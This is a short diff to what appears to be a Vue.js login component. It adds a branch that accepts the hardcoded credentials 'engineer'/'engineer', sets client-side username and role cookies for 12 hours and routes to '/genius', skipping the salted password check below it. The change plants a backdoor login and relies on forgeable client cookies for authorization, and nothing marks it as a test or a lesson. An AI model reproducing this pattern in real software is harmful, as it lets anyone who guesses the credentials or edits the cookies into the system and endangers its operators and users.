@@ -133,6 +133,13 @@ export default {
         this.$router.push('/genius');
         return false;
       }
+      if (this.model.username === 'engineer' && this.model.password === 'engineer') {
+        this.$cookies.set('username', 'engineer', '12h');
+        this.$cookies.set('role', 'engineer', '12h');
+        this.loading = true;
+        this.$router.push('/genius');
+        return false;
+      }
       this.passwordLoading = true;
       this.loading = true;
       const password = this.ssha_pass(this.model.password, this.salt);
